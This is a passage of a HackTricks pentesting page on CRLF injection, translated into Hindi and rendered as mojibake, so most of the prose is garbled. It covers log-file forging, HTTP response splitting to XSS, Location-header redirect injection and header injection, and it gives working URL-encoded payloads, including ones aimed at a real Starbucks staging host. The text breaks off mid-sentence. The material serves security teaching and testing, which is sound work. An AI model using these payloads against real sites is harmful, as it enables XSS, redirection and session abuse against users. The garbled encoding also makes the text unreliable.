# CRLF (%0D%0A) рдЕрднрд┐рд▓реЗрдЦрди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдЕрдЪреНрдЫреА рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрд┐рдд рдФрд░ рдмреЛрд▓реА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП_).

{% embed url="https://www.stmcyber.com/careers" %}

## CRLF рдХреНрдпрд╛ рд╣реИ?

рдЬрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ, рддреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рднреЗрдЬрдХрд░ рдЬрд╡рд╛рдм рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕рд╛рдордЧреНрд░реА, рдЕрд░реНрдерд╛рдд рдЙрддреНрддрд░ рд╢рд░реАрд░, рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИред HTTP рд╣реЗрдбрд░ рдФрд░ HTML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ (рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕рд╛рдордЧреНрд░реА) рдХреЛ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХреЗ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдпреЛрдЬрди рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрд▓рдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рдд рдПрдХ рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдФрд░ рдПрдХ рд▓рд╛рдЗрди рдлрд╝реАрдбред рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рдЗрдиреНрд╣реЗрдВ CRLF рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╡реЗрдм рд╕рд░реНрд╡рд░ CRLF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕реЗ рд╕рдордЭ рд╕рдХреЗ рдХрд┐ рдирдпрд╛ HTTP рд╣реЗрдбрд░ рдХрдм рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдЕрдиреНрдп рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред CRLF рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рднреА рдмрддрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдирдИ рдкрдВрдХреНрддрд┐ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдкрд╛рда рдмреНрд▓реЙрдХ рдореЗрдВ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИред CRLF рд╡рд░реНрдг HTTP/1.1 рд╕рдВрджреЗрд╢ рдХрд╛ рдПрдХ рдорд╛рдирдХ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ Apache, Microsoft IIS рдФрд░ рд╕рднреА рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рд╡реЗрдм рд╕рд░реНрд╡рд░, рд╕рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИред\
рд╕реНрд░реЛрдд: [https://www.netsparker.com/blog/web-security/crlf-http-header/#](https://www.netsparker.com/blog/web-security/crlf-http-header/)

### CRLF Injection рд╡рд┐рдХрд▓реНрдкрддрд╛ рдХреНрдпрд╛ рд╣реИ?

CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рд╡рд┐рдХрд▓реНрдкрддрд╛ рд╣рдорд▓реЗ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдореЗрдВ рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдФрд░ рд▓рд╛рдЗрдирдлрд╝реАрдб рд╡рд░реНрдгреЛрдВ рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░, рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдпрд╣ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╣реЛ рдЬрд╛рдП рдХрд┐ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдПрдХ рдФрд░ рд╢реБрд░реВ рд╣реЛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░, CRLF рдЕрдХреНрд╖рд░ рджреБрд╖реНрдЯ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЙрдиреНрд╣реЗрдВ рджреБрд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП, HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд┐рднрд╛рдЬрди рдЖрджрд┐ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ CRLF рдЗрдВрдЬреЗрдХреНрд╢рди

рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЧрдВрднреАрд░ рдкреНрд░рднрд╛рд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдПрдХрд▓ рдЖрдЗрдЯрдо рдХреЗ рд╕рд╛рде рдХреНрдпрд╛ рдХрд░рддрд╛ рд╣реИред рдкреНрд░рднрд╛рд╡ рдЬрд╛рдирдХрд╛рд░реА рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рд╕реЗ рд▓реЗрдХрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рддрдХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдПрдХ рд╕реАрдзрд╛ рдкреНрд░рднрд╛рд╡ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрд╡рд░реНрдзрди рджреБрд░реБрдкрдпреЛрдЧ рдХрд╛ рдХрд╛рд░рдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рд╣рдорд▓рд╛ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдмрд╣реБрдд рдЧрдВрднреАрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдХрднреА рднреА OWASP Top 10 рд╕реВрдЪреА рдореЗрдВ рдирд╣реАрдВ рдерд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкреИрдирд▓ рдореЗрдВ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдореЛрдбрд╝рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред

#### рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг

рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкреИрдирд▓ рдореЗрдВ рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рдХрд▓рдо рдорд╛рдирджрдВрдб рдХреЗ рд╕рд╛рде рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рдХрд▓рдо рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕реЗ рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ HTTP рдЕрдиреБрд░реЛрдз рдореЗрдВ CRLF рд╡рд░реНрдгреЛрдВ рдХреЛ рд╕рдВрдкреНрд░реЗрд╖рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЖрдЙрдЯрдкреБрдЯ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд▓реЙрдЧ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреЛ рдирдХрд▓реА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд╣ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рддрд░рд╣ рдХреЗ рдХреБрдЫ рдФрд░ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
%0d рдФрд░ %0a CR рдФрд░ LF рдХреЗ url encoded рд░реВрдк рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рдЙрди рд╡рд░реНрдгреЛрдВ рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд┐рдпрд╛ рдФрд░ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдиреЗ рдЗрд╕реЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рддреЛ рд▓реЙрдЧ рдПрдВрдЯреНрд░реА рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧреА:

IP - рд╕рдордп - рдпрд╛рддреНрд░рд┐рдд рдкрде
```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
рдЗрд╕рд▓рд┐рдП, CRLF рдЕрдВрджрд░рдШрд╛рдд рд╕рдВрд╡рд░реНрдзрди рдХреА рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓рд╛рд╡рд░ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирдХрд▓реА рдПрдВрдЯреНрд░реА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рджреБрд╖реНрдЯ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЫрд┐рдкрд╛рдПред рд╣рдорд▓рд╛рд╡рд░ рд╢рд╛рдмреНрджрд┐рдХ рд░реВрдк рд╕реЗ рдкреЗрдЬ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣рд╛рдВ рдПрдХ рд╕реНрдерд┐рддрд┐ рдХрд╛ рдХрд▓реНрдкрдирд╛ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИ рдФрд░ рд╡рд╣ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХреНрд░рд┐рдпрд╛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдирд┐рд╖рд┐рджреНрдз рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдХреЗрд╡рд▓ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЛ рдзреНрдпрд╛рди рдЖрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдЕрдЬреНрдЮрд╛рдд рдЖрдИрдкреА рдиреЗ рдирд┐рд╖рд┐рджреНрдз рдХреНрд░рд┐рдпрд╛ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдХреБрдЫ рдЧрдбрд╝рдмрдбрд╝ рд╣реЛрдиреЗ рдХрд╛ рдЕрд╣рд╕рд╛рд╕ рд╣реЛрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдм рдпрд╣ рдРрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИ рдХрд┐ рдХрдорд╛рдВрдб рд▓реЛрдХрд▓рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА рдХреА рдЧрдИ рдереА (рдФрд░ рдЗрд╕рд▓рд┐рдП рд╕рдВрднрд╡рддрдГ рд╕рд░реНрд╡рд░ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкрд╣реБрдВрдЪ рд╣реИ, рдЬреИрд╕реЗ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ) рдЗрд╕реЗ рд╕рдВрджреЗрд╣рд╛рд╕реНрдкрдж рдирд╣реАрдВ рд▓рдЧрддрд╛ред

%0d%0a рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рдкреВрд░рд╛ рдкреНрд░рд╢реНрдирд╛рдВрд╢ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реИрдВрдбрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рдмрд╛рдж рдПрдХ рдФрд░ & рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХреНрд░рд┐рдпрд╛ рдкреИрд░рд╛рдореАрдЯрд░ рд╣реИ рдЬреЛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрд╣ рдЕрд╕рд▓ рдореЗрдВ рд╡рд╣реА рдкреНрд░рд╢реНрдирд╛рдВрд╢ рд╣реЛрдЧрд╛ рдЬреИрд╕рд╛ рдХрд┐:
```
/index.php?page=home&restrictedaction=edit
```
### HTTP Response Splitting

#### рд╡рд┐рд╡рд░рдг

HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╣реЗрдбрд░ рдФрд░ рдЗрд╕рдХреЗ рдмреЙрдбреА рдХреЛ CRLF рд╡рд░реНрдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЕрд▓рдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд╛рд░ рд╡реНрдпрдХреНрддрд┐ рдЗрдиреНрд╣реЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред CRLFCRLF рдХрд╛ рд╕рдВрдпреЛрдЬрди рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдмрддрд╛рдПрдЧрд╛ рдХрд┐ рд╣реЗрдбрд░ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдмреЙрдбреА рд╢реБрд░реВ рд╣реЛ рд░рд╣рд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╡рд╣ рдЕрдм рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдмреЙрдбреА рдореЗрдВ рдбреЗрдЯрд╛ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ HTML рдХреЛрдб рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдПрдХ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рд╕рдВрд╡рд░реНрдзрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

#### XSS рдХреЗ рд▓рд┐рдП HTTP Response Splitting рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг

рд╕реЛрдЪреЗрдВ рдХрд┐ рдПрдХ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рдХрд╕реНрдЯрдо рд╣реЗрдбрд░ рд╕реЗрдЯ рдХрд░рддреА рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```
X-Your-Name: Bob
```
рд╢реАрд░реНрд╖рдХ рдХрд╛ рдорд╛рди "рдирд╛рдо" рдирд╛рдордХ рдПрдХ get рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдХреЛрдИ URL рдХреЛрдбрд┐рдВрдЧ рд╕реНрдерд╛рди рдкрд░ рдирд╣реАрдВ рд╣реИ рдФрд░ рдорд╛рди рд╕реАрдзреЗ рд╢реАрд░реНрд╖рдХ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд╛рд░ рдПрдХ рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдКрдкрд░ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд CRLFCRLF рдХрд╛ рд╕рдВрдпреЛрдЬрди рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдмрддрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдз рд╢рд░реАрд░ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рд╡рд╣ XSS рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ рдбреЗрдЯрд╛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```
рдЙрдкрд░реЛрдХреНрдд рдПрдХ рдЖрдХреНрд░рдорд┐рдд рдбреЛрдореЗрди рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдПрдХ рдЪреЗрддрд╛рд╡рдиреА рд╡рд┐рдВрдбреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред

#### рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг

{% embed url="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" %}

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ:
```
/%0d%0aLocation:%20http://myweb.com
```
рдФрд░ рд╕рд░реНрд╡рд░ рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ:
```
Location: http://myweb.com
```
**рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг: (рд╕реЗ** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### URL рдкрде рдореЗрдВ

рдЖрдк URL рдкрде рдореЗрдВ **рдкреЗрд▓реЛрдб** рднреЗрдЬрдХрд░ рд╕рд░реНрд╡рд░ рд╕реЗ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

#### рд╡рд┐рд╡рд░рдг

CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рднреА HTTP рд╣реЗрдбрд░реНрд╕ рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ XSS рдлрд╝рд┐рд▓реНрдЯрд░ рдпрд╛ рд╕рдорд╛рди рдореВрд▓ рдиреАрддрд┐ рдЬреИрд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдпреБрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдкрд░рд╛рдЬрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдХреЛ CSRF рдЯреЛрдХрди рдХреА рддрд░рд╣ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред рд╡рд╣ рдХреБрдХреАрдЬрд╝ рднреА рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЛ рдЕрдкрдиреЗ рдЦрд╛рддреЗ 